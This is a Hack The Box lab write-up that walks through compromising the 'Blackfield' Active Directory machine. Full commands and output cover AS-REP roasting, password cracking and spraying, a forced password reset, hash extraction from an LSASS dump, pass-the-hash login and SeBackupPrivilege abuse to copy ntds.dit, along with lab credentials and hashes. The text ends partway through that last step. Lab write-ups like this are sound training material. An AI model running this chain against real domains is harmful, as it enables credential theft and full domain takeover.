---
title: "Blackfield - HTB Writeup"
header:
  teaser: /assets/images/2024-01-29-Blackfield-HTB-Writeup/Blackfield-HTB-Image.png
  header: /assets/images/2024-01-29-Blackfield-HTB-Writeup/Blackfield-HTB-Image.png
  og_image: /assets/images/2024-01-29-Blackfield-HTB-Writeup/Blackfield-HTB-Image.png
excerpt: "Blackfield is a Hard rated box from HackTheBox. It features a fairly common exploitation path for Windows Active Directory. In this guide we will freshen up on our use of AS-REP roasting and bloodhound."
tags: [htb, writeup, blackfield]
---

## Blackfield - High Level Summary

Blackfield is a Hard rated box from HackTheBox. It features a fairly common exploitation path for Windows Active Directory. In this guide we will freshen up on our use of AS-REP roasting and bloodhound. This box was done to work on training for my OSCP. I would thoroughly recommend this for anyone that is getting into Active Directory exploitation as this is one of the most common paths you're going to take on your exam in my experience. A special trick, for those who stick through it, will be the docker command that I use to run Bloodhound on my Kali box with full graphics abilities. This is a great way to run Bloodhound in Docker with a fresh environment each time. I really like this because it avoids the uncessary setup for Bloodhounds DB and more.

### Recommendations

- Privilege Audit of the Entire AD
- Re-Evaluation on the Use of AS-REP Roastable Accounts
- Password Audit to Ensure Complexity

---

## Blackfield - Methodologies

### Information Gathering

#### Nmap Port Scan

Nmap performs port scanning on the target machine to identify open ports and services. This appears to be a standard Microsoft Windows Active Directory server that is also running a DNS service on port 53. The Kerberos service is running on port 88 and that will become the first target of our service enumeration. The server also exposes the LDAP service to provide directory access to the rest of the environment.

```bash
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ nmap -sV -sC -Pn -oN 10.10.10.192/nmap.out 10.10.10.192
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 21:53 EST
Nmap scan report for 10.10.10.192
Host is up (0.040s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-20 10:53:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| smb2-time: 
|   date: 2023-02-20T10:53:31
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.72 seconds
```

### Service Enumeration

#### Nmap LDAP Scan

We can utilize Nmap's scripting engine to further enumerate the LDAP service with the following command. The output shows basic information about the directory. This is the most we can find about the LDAP service without further authentication.

```bash
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ nmap -oN 10.10.10.192/nmap.ldap -n -sV --script "ldap* and not brute" -Pn -p 389 10.10.10.192
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 21:56 EST
Nmap scan report for 10.10.10.192
Host is up (0.036s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=BLACKFIELD,DC=local
|       ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
|       isGlobalCatalogReady: TRUE
### SNIP ###
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
|       namingContexts: DC=BLACKFIELD,DC=local
|       namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
|       namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
|       namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
|       isSynchronized: TRUE
|       highestCommittedUSN: 229466
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
|       dnsHostName: DC01.BLACKFIELD.local
|       defaultNamingContext: DC=BLACKFIELD,DC=local
|       currentTime: 20230220105658.0Z
|_      configurationNamingContext: CN=Configuration,DC=BLACKFIELD,DC=local
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

#### Kerberos User Enumeration

When I'm working with a HackTheBox machine and running the Kerberos protocol the first tool I will run is Kerbrute. You can download it on the [Kerbrute Releases Page](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3), and use it as shown below. This tool will use the pre-authentication system on the kerberos service to determine valid users on the target domain. If users are AS-REP roastable it will also pull their password hashes for further use.

```bash
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ ./kerbrute_linux_amd64 userenum -d BLACKFIELD.local --dc 10.10.10.192 /usr/share/wordlists/seclist

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/19/23 - Ronnie Flathers @ropnop

2023/02/19 22:12:15 >  Using KDC(s):
2023/02/19 22:12:15 >   10.10.10.192:88

2023/02/19 22:15:39 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2023/02/19 22:17:15 >  [+] VALID USERNAME:       guest@BLACKFIELD.local
2023/02/19 22:28:02 >  [+] VALID USERNAME:       administrator@BLACKFIELD.local
```

#### AS REP Roasting Users

Once a list of domain users has been created we can use [Impacket](https://github.com/fortra/impacket) to send AS REP queries to the domaian controller. If any of these accounts have `UF_DONT_REQUIRE_PREAUTH` set on their accounts then we can query the password hash of the given account. This is then output into a file for JohnTheRipper to use. John is able to crack the password hash and provide us with the credentials of the `support@BLACKFIELD.local` user as shown below.

`support@BLACKFIELD.local:#00^BlackKnight`

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ impacket-GetNPUsers 'BLACKFIELD.local/' -usersfile users.list -dc-ip 10.10.10.192 -format john -outputfile asrep.hashes -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User guest@BLACKFIELD.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@BLACKFIELD.local doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                      
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ cat asrep.hashes 
$krb5asrep$support@BLACKFIELD.local@BLACKFIELD.LOCAL:dfd960ebdbaad893c10cc87bc0a50e43$8af2fd4c6b99f96c3382f334c7a6f362229b5a840d38046246bd30c01aa0cd9e3270d3b8d346aed0d0faa6d6b039de7134b386f1e67046417f592094976f37141c73b63d079940e9a51ef74c2ebd59ce7a60a36a5816c270911398e4477f8dca1a10e7b0a8686d0a748f89b044ea439dd98799c54464bef72483c230eeb9a4f4405ee0fc0c550e3fb7c64e6fc58ee490a0f5a466e1f99133f429cce72d6d582459a866abf8087e1a4e54861dfb0d381cb09c2f6f63cb753c4edb22a234ee15cbaa60c72681857f9bc871f743247539a0393b307f3ef062ecaef8513aba94a9fff7351de0b6ea7ec9080e74f701cfe48d21393fa8
                                                                                                      
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.local@BLACKFIELD.LOCAL)     
1g 0:00:00:06 DONE (2023-02-19 22:48) 0.1459g/s 2092Kp/s 2092Kc/s 2092KC/s #1WIF3Y.."chito"
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Penetration

#### Authenticated SMB Enumeration

With smbmap we can use our credentials to enumerate the SMB service. There appears to be a number of non-default shares on the target server that this user can access.

```bash
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ smbmap -d 'BLACKFIELD.local' -u 'support' -p '#00^BlackKnight' -H 10.10.10.192
[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
```

Further enumeration of the `profiles$` share shows that we can access directories for all users on the box. At minimum th is provides us with a much larger username list. For this I copied out the list of users and to users.list and then I used `cat users.list | awk '{print $1}'` to format just the usernames out of it. That output was then saved back to users.list

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ smbclient '//10.10.10.192/profiles$' -U 'BLACKFIELD.LOCAL/support'                     
Password for [BLACKFIELD.LOCAL\support]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
### SNIP ###
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1690956 blocks available
smb: \> 
```

With some further investigation it appears that not all users in the list are real. We can use this list to determine real users once again with Kerbrute as shown below. The list returned will supply us with the relevent list of usernames for the domain.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ ./kerbrute_linux_amd64 userenum -d BLACKFIELD.local --dc 10.10.10.192 ./users.list

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/19/23 - Ronnie Flathers @ropnop

2023/02/19 23:18:30 >  Using KDC(s):
2023/02/19 23:18:30 >   10.10.10.192:88

2023/02/19 23:18:50 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2023/02/19 23:20:42 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2023/02/19 23:20:47 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2023/02/19 23:21:12 >  Done! Tested 314 usernames (3 valid) in 162.496 seconds
```

We can use Crackmapexec to brute force the SMB service to see if the password is reused across any of the common accounts. The password is not used across any other accounts. The two `audit2020` and `svc_backup` accounts catch my eye as I would assume that they both have higher permissions on the domain. In a Windows domain, backup privileges can be easily exploited to gain administrative permissions.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ mkdir crackmap
                                                                                                      
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ echo 'audit2020                                           
quote> support
quote> guest                                                    
quote> svc_backup                                                        
quote> administrator
quote> ' > crackmap/updatedusers.list
                                                                                                      
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ cd crackmap 
                                                                                                   
┌──(thadigus㉿kali)-[~/HTB/Blackfield/crackmap]
└─$ crackmapexec smb 10.10.10.192 -d 'BLACKFIELD.local' -u ./updatedusers.list -p '#00^BlackKnight' --continue-on-success
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\audit2020:#00^BlackKnight STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\guest:#00^BlackKnight STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_backup:#00^BlackKnight STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\administrator:#00^BlackKnight STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\:#00^BlackKnight 
```

### Privilege Escalation

#### Domain Enumeration with BloodHound

At this point we're out of options with SMB. Since we have one valid set of user credentials for the box, we can utilize BloodHound to enumerate the target domain. First we install `bloodhound.py` using `apt` and then we utilize our current credentials to perform enumeration of the target domain.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ sudo apt install bloodhound.py

┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 08S
```

Now that we have created a bundle of information for the current domain we can analyze it using BloodHound.

```shell
sudo apt install docker.io
sudo xhost +local:$(id -nu)
sudo docker run -it --rm -p 7474:7474 -e DISPLAY=unix$DISPLAY -v '/tmp/.X11-unix:/tmp/.X11-unix' --device=/dev/dri:/dev/dri -v $(pwd):/data --name bloodhound docker.io/belane/bloodhound
```

#### ForceChangePassword Object Control on `Audit2020`

After enumerating our rights with BloodHound we can locate our node by searching for it in the top of the menu. Once we select it the 'Outbound Object Control' section shows the privileges we have within the domain over other objects. We only have one, but it appears that we can change the password of the `audit2020` user. With this information we can set a new password and login as the `audit2020` user.

![Screenshot](/assets/images/2023-02-20-Blackfield-HTB-Writeup/Screenshot_90.png)

The process for changing a user password over RPC is outlined in [this article](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) and it can be done in Linux with RPC Client.c

```bash
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ rpcclient -U BLACKFIELD.local/support //10.10.10.192
Password for [BLACKFIELD.LOCAL\support]:
rpcclient $> setuserinfo2 audit2020 23 'JustTesting123'
```

#### SMB Enumeration as `audit2020`

Now that we have valid credentials for the `audit2020` user we can enumerate SMB once more. With smbmap we find that the user has 'READ ONLY' access to the `forensic` share on the server. Further enumeration of this share shows a number of files that we can pull down.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ smbclient //10.10.10.192/forensic -U 'BLACKFIELD.local/audit2020'
Password for [BLACKFIELD.LOCAL\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1688967 blocks available
smb: \> ls commands_output\
  .                                   D        0  Sun Feb 23 13:14:37 2020
  ..                                  D        0  Sun Feb 23 13:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020

                5102079 blocks of size 4096. 1688967 blocks available
smb: \> ls memory_analysis\
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                5102079 blocks of size 4096. 1688967 blocks available
smb: \> ls tools\
  .                                   D        0  Sun Feb 23 08:39:08 2020
  ..                                  D        0  Sun Feb 23 08:39:08 2020
  sleuthkit-4.8.0-win32               D        0  Sun Feb 23 08:39:03 2020
  sysinternals                        D        0  Sun Feb 23 08:35:25 2020
  volatility                          D        0  Sun Feb 23 08:35:39 2020

                5102079 blocks of size 4096. 1688963 blocks available
```

We can use a CIFS mount to copy over all of the necessary files.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ sudo mkdir /mnt/win_share
[sudo] password for thadigus: 

┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ sudo mount -t cifs -o username=audit2020 //10.10.10.192/forensic /mnt/win_share 
Password for audit2020@//10.10.10.192/forensic: 

┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ mkdir ./forensic_smb
                                                              
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ cp -r /mnt/win_share/* ./forensic_smb

┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ sudo umount /mnt/win_share                                                     
                                                                                                                                                                                                                
┌──(thadigus㉿kali)-[~/HTB/Blackfield]
└─$ sudo rm -rf /mnt/win_share 
```

#### Analysis of Forensics Share

There is an LSASS dump on the forensics share. This data could be leftover results from a recent penetration test, security testing, or a previous compromise. This type of information should be secured heavily. We can open up this and utilize a tool to dump the information from the LSASS process. The LSASS (Local Security Authority Subsystem Service) is response for local authentication

We can setup pypykatz to dump the hashes and for users in the LSASS database.

```shell
pip3 install minidump minikerberos aiowinreg msldap winacl
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
sudo python3 setup.py install
```

Using pypykatz, we can perform an `lsa minidump` on our dump of the LSASS database. From here we are granted with extremely sensitive password hashes for the svc_backup user.

```shell
┌──(thadigus㉿kali)-[~/…/Blackfield/forensic_smb/memory_analysis/lsass]
└─$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
```

Using the hashes that we retrieved from LSASS, we can use Evil-WinRM with the Pass-The-Hash attack in order to authenticate against the target server without even cracking the user password hash!

```shell
┌──(thadigus㉿kali)-[~/…/Blackfield/forensic_smb/memory_analysis/lsass]
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

#### Backup Privilege Abuse

The backup_svc user is always a particularly interesting user to look into. While the username might not be the exact same in real environments, you'll often find that a backup user like this service account will have elevated access to the SeBackupPrivilege permission. Due to this access the user can abuse their rights to create a backup, and read the contents of the file system. One way we can think about this access is that it will essentially provide the user with system level access to all files on the device. This user should be treated with the same security as any full-acccess administrator. [This article](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960) will provide us with instruction on how to perform the following attack chain, where we will use our backup privileges to access the ntds.dit file to extract user password hashes.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield/privesc]
└─$ echo 'set verbose onX                                                         
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX' > backupscript.txt
                                                                                                                                                                                                                
┌──(thadigus㉿kali)-[~/HTB/Blackfield/privesc]
└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'   

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload /home/thadigus/HTB/Blackfield/privesc/backupscript.txt
Info: Uploading /home/thadigus/HTB/Blackfield/privesc/backupscript.txt to C:\Users\svc_backup\Documents\backupscript.txt

                                                             
Data: 252 bytes of 252 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/26/2023   8:16 PM            191 backupscript.txt


*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s backupscript.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  2/26/2023 8:43:16 PM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,
because it requires volume  which is not in the shadow copy set.
The writer "ASR Writer" is now entirely excluded from the backup because the top-level
non selectable component "\BCD\BCD" is excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
        + Adding component: \PerformanceCounters

* Including writer "System Writer":
        + Adding component: \System Files
        + Adding component: \Win32 Services Files

* Including writer "WMI Writer":
        + Adding component: \WMI

* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\B0E5E5E5-367C-47BD-8D81-52FF1C8853A7-A711151C-FA0B-40DD-8BDB-780EF9825004

* Including writer "Registry Writer":
        + Adding component: \Registry

* Including writer "COM+ REGDB Writer":
        + Adding component: \COM+ REGDB

* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds

Alias cdrive for shadow ID {10c53d13-aa53-4359-9b2c-75879f4a57e1} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {8be740bc-ae10-4869-8c95-f8a084cf50d3} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab
Inserted file WM1.xml into .cab file meta.cab
Inserted file WM2.xml into .cab file meta.cab
Inserted file WM3.xml into .cab file meta.cab
Inserted file WM4.xml into .cab file meta.cab
Inserted file WM5.xml into .cab file meta.cab
Inserted file WM6.xml into .cab file meta.cab
Inserted file WM7.xml into .cab file meta.cab
Inserted file WM8.xml into .cab file meta.cab
Inserted file WM9.xml into .cab file meta.cab
Inserted file WM10.xml into .cab file meta.cab
Inserted file Dis598D.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {8be740bc-ae10-4869-8c95-f8a084cf50d3}

        * Shadow copy ID = {10c53d13-aa53-4359-9b2c-75879f4a57e1}               %cdrive%
                - Shadow copy set: {8be740bc-ae10-4869-8c95-f8a084cf50d3}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 2/26/2023 8:43:31 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {10c53d13-aa53-4359-9b2c-75879f4a57e1}
The shadow copy was successfully exposed as E:\.
-> end backup
->
*Evil-WinRM* PS C:\Users\svc_backup\Documents> E:
*Evil-WinRM* PS E:\> dir


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt


*Evil-WinRM* PS E:\> cd C:\Users\svc_backup\Documents

*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b E:\Users\Administrator\Desktop\root.txt . robots.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, February 26, 2023 8:50:13 PM
   Source : E:\Users\Administrator\Desktop\root.txt\
     Dest : C:\Users\svc_backup\Documents\

    Files : robots.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

2023/02/26 20:50:13 ERROR 123 (0x0000007B) Accessing Source Directory E:\Users\Administrator\Desktop\root.txt\
The filename, directory name, or volume label syntax is incorrect.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/26/2023   8:16 PM            191 backupscript.txt


*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, February 26, 2023 8:52:11 PM
   Source : E:\Windows\ntds\
     Dest : C:\Users\svc_backup\Documents\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    E:\Windows\ntds\
            New File              18.0 m        ntds.dit
  0.0%
### SNIP ###
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           419430400 Bytes/sec.
   Speed :           24000.000 MegaBytes/min.
